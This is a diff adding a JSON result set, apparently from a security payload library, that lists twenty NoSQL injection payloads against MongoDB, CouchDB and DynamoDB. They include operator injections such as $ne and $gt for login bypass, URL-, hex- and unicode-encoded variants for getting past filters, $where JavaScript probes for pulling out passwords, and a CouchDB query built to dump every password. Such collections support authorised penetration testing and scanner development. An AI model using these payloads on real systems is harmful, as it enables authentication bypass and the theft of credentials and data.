@@ -1,0 +1,360 @@
+{
+  "query": {
+    "limit": 20,
+    "max_risk": 3,
+    "vuln_type": "nosql"
+  },
+  "count": 20,
+  "results": [
+    {
+      "id": "00a1b2b4f7938433",
+      "payload": "[$gt]=",
+      "technique": "nosql_injection",
+      "injection_surface": "query",
+      "encoding": "raw",
+      "evidence_type": "boolean_diff",
+      "risk": 2,
+      "placeholders": [],
+      "notes": "Query param operator injection. Use as: username[$gt]=\u0026password[$gt]=",
+      "source": "ensphere",
+      "tags": [
+        "mongodb",
+        "operator",
+        "query_param"
+      ]
+    },
+    {
+      "id": "025f6065932b90ae",
+      "payload": "[$ne]=invalid",
+      "technique": "nosql_injection",
+      "injection_surface": "query",
+      "encoding": "raw",
+      "evidence_type": "boolean_diff",
+      "risk": 2,
+      "placeholders": [],
+      "notes": "Query param $ne injection. Matches all docs where field != 'invalid'.",
+      "source": "ensphere",
+      "tags": [
+        "mongodb",
+        "ne",
+        "query_param"
+      ]
+    },
+    {
+      "id": "09dc35c8ddd3632a",
+      "payload": "[$gt]=",
+      "technique": "operator_injection",
+      "injection_surface": "form_body",
+      "encoding": "raw",
+      "evidence_type": "boolean_diff",
+      "risk": 2,
+      "placeholders": [],
+      "notes": "NoSQL operator injection via form body parameter.",
+      "source": "ensphere",
+      "tags": [
+        "form",
+        "mongodb",
+        "operator"
+      ]
+    },
+    {
+      "id": "2e2b7cb70eeb1159",
+      "payload": "{\"\\u0024ne\": \"\"}",
+      "technique": "nosql_injection",
+      "injection_surface": "json_body",
+      "encoding": "unicode",
+      "evidence_type": "boolean_diff",
+      "risk": 2,
+      "placeholders": [],
+      "notes": "Unicode-escaped $ne in JSON body. Some JSON parsers decode \\u0024 to $ before query construction.",
+      "source": "ensphere",
+      "tags": [
+        "mongodb",
+        "ne",
+        "operator",
+        "unicode"
+      ]
+    },
+    {
+      "id": "591f5b0a54200248",
+      "payload": "{\"$ne\": \"\"}",
+      "technique": "operator_injection",
+      "injection_surface": "json_body",
+      "encoding": "raw",
+      "evidence_type": "boolean_diff",
+      "risk": 2,
+      "placeholders": [],
+      "notes": "MongoDB $ne empty string. Bypasses empty password check.",
+      "source": "ensphere",
+      "tags": [
+        "auth_bypass",
+        "mongodb",
+        "ne",
+        "operator"
+      ]
+    },
+    {
+      "id": "5a07f26c8ff7b177",
+      "payload": "%5B%24gt%5D=",
+      "technique": "nosql_injection",
+      "injection_surface": "query",
+      "encoding": "url",
+      "evidence_type": "boolean_diff",
+      "risk": 2,
+      "placeholders": [],
+      "notes": "URL-encoded [$gt]= operator injection.",
+      "source": "ensphere",
+      "tags": [
+        "mongodb",
+        "operator",
+        "url_encoded"
+      ]
+    },
+    {
+      "id": "6885aa4eacc7c558",
+      "payload": "{\"$gt\": \"\"}",
+      "technique": "operator_injection",
+      "injection_surface": "cookie",
+      "encoding": "raw",
+      "evidence_type": "boolean_diff",
+      "risk": 2,
+      "placeholders": [],
+      "notes": "NoSQL operator injection via cookie value.",
+      "source": "ensphere",
+      "tags": [
+        "cookie",
+        "mongodb",
+        "operator"
+      ]
+    },
+    {
+      "id": "7299d22439325451",
+      "payload": "{\"$gt\": \"\"}",
+      "technique": "operator_injection",
+      "injection_surface": "header",
+      "encoding": "raw",
+      "evidence_type": "boolean_diff",
+      "risk": 2,
+      "placeholders": [],
+      "notes": "NoSQL operator injection via custom header (if header values used in DB queries).",
+      "source": "ensphere",
+      "tags": [
+        "header",
+        "mongodb",
+        "operator"
+      ]
+    },
+    {
+      "id": "76d2533fb8e70b4f",
+      "payload": "%5B%24ne%5D=invalid",
+      "technique": "nosql_injection",
+      "injection_surface": "query",
+      "encoding": "url",
+      "evidence_type": "boolean_diff",
+      "risk": 2,
+      "placeholders": [],
+      "notes": "URL-encoded [$ne] injection.",
+      "source": "ensphere",
+      "tags": [
+        "mongodb",
+        "ne",
+        "url_encoded"
+      ]
+    },
+    {
+      "id": "7d1412f37833e828",
+      "payload": "[\\u0024gt]=",
+      "technique": "nosql_injection",
+      "injection_surface": "query",
+      "encoding": "unicode",
+      "evidence_type": "boolean_diff",
+      "risk": 2,
+      "placeholders": [],
+      "notes": "Unicode-escaped $ in operator. \\u0024 decodes to $, may bypass string filters.",
+      "source": "ensphere",
+      "tags": [
+        "gt",
+        "mongodb",
+        "operator",
+        "unicode"
+      ]
+    },
+    {
+      "id": "9d082ec63b4d5f63",
+      "payload": "{\"$ne\": null}",
+      "technique": "operator_injection",
+      "injection_surface": "json_body",
+      "encoding": "raw",
+      "evidence_type": "boolean_diff",
+      "risk": 2,
+      "placeholders": [],
+      "notes": "MongoDB $ne null. Matches all documents where field exists.",
+      "source": "ensphere",
+      "tags": [
+        "mongodb",
+        "ne",
+        "operator"
+      ]
+    },
+    {
+      "id": "a6aab4502a3909d5",
+      "payload": "[%24gt]=",
+      "technique": "nosql_injection",
+      "injection_surface": "query",
+      "encoding": "hex",
+      "evidence_type": "boolean_diff",
+      "risk": 2,
+      "placeholders": [],
+      "notes": "Hex-encoded $ as %24 within bracket notation. Single-layer encoding variant.",
+      "source": "ensphere",
+      "tags": [
+        "gt",
+        "hex",
+        "mongodb",
+        "operator"
+      ]
+    },
+    {
+      "id": "e8cc20af835d1f6e",
+      "payload": "{\"$gt\": \"\"}",
+      "technique": "operator_injection",
+      "injection_surface": "json_body",
+      "encoding": "raw",
+      "evidence_type": "boolean_diff",
+      "risk": 2,
+      "placeholders": [],
+      "notes": "MongoDB $gt operator. If injected into query filter, matches all non-empty values.",
+      "source": "ensphere",
+      "tags": [
+        "confirmation",
+        "gt",
+        "mongodb",
+        "operator"
+      ]
+    },
+    {
+      "id": "f1d156eb66f16d74",
+      "payload": "{\"$exists\": true}",
+      "technique": "operator_injection",
+      "injection_surface": "json_body",
+      "encoding": "raw",
+      "evidence_type": "boolean_diff",
+      "risk": 2,
+      "placeholders": [],
+      "notes": "MongoDB $exists check. Confirms field presence in collection.",
+      "source": "ensphere",
+      "tags": [
+        "exists",
+        "mongodb",
+        "operator",
+        "probe"
+      ]
+    },
+    {
+      "id": "feccfd1f6400aae3",
+      "payload": "{\"$in\": [\"admin\", \"root\", \"user\"]}",
+      "technique": "operator_injection",
+      "injection_surface": "json_body",
+      "encoding": "raw",
+      "evidence_type": "boolean_diff",
+      "risk": 2,
+      "placeholders": [],
+      "notes": "MongoDB $in operator. Tests if field matches common values.",
+      "source": "ensphere",
+      "tags": [
+        "in",
+        "mongodb",
+        "operator"
+      ]
+    },
+    {
+      "id": "2365195b07f46420",
+      "payload": "{\"selector\": {\"password\": {\"$regex\": \".*\"}}, \"limit\": 999}",
+      "technique": "nosql_injection",
+      "injection_surface": "json_body",
+      "encoding": "raw",
+      "evidence_type": "content_match",
+      "risk": 3,
+      "placeholders": [],
+      "notes": "CouchDB Mango $regex to match all passwords. High limit to dump entire collection.",
+      "source": "ensphere",
+      "tags": [
+        "couchdb",
+        "dump",
+        "mango",
+        "regex"
+      ]
+    },
+    {
+      "id": "273de4613d2280c8",
+      "payload": "{\"$where\": \"this.username.match(/^a/)\"}",
+      "technique": "js_injection",
+      "injection_surface": "json_body",
+      "encoding": "raw",
+      "evidence_type": "boolean_diff",
+      "risk": 3,
+      "placeholders": [],
+      "notes": "MongoDB $where regex extraction via JS match.",
+      "source": "ensphere",
+      "tags": [
+        "extraction",
+        "js",
+        "mongodb",
+        "regex",
+        "where"
+      ]
+    },
+    {
+      "id": "2a852b9a27c8fd0e",
+      "payload": "{\"$where\": \"this.password.length \u003e 0\"}",
+      "technique": "js_injection",
+      "injection_surface": "json_body",
+      "encoding": "raw",
+      "evidence_type": "boolean_diff",
+      "risk": 3,
+      "placeholders": [],
+      "notes": "MongoDB $where JS to probe field existence and content.",
+      "source": "ensphere",
+      "tags": [
+        "extraction",
+        "js",
+        "mongodb",
+        "where"
+      ]
+    },
+    {
+      "id": "2aec1a59c01bbe16",
+      "payload": "{\"$regex\": \".*\"}",
+      "technique": "operator_injection",
+      "injection_surface": "json_body",
+      "encoding": "raw",
+      "evidence_type": "boolean_diff",
+      "risk": 3,
+      "placeholders": [],
+      "notes": "MongoDB $regex match all. Returns all matching documents.",
+      "source": "ensphere",
+      "tags": [
+        "mongodb",
+        "operator",
+        "regex"
+      ]
+    },
+    {
+      "id": "3300b7a50f6fab90",
+      "payload": "attribute_exists(password)",
+      "technique": "nosql_injection",
+      "injection_surface": "json_body",
+      "encoding": "raw",
+      "evidence_type": "boolean_diff",
+      "risk": 3,
+      "placeholders": [],
+      "notes": "DynamoDB condition expression injection. Tests if attribute exists.",
+      "source": "ensphere",
+      "tags": [
+        "condition",
+        "dynamodb",
+        "probe"
+      ]
+    }
+  ]
+}
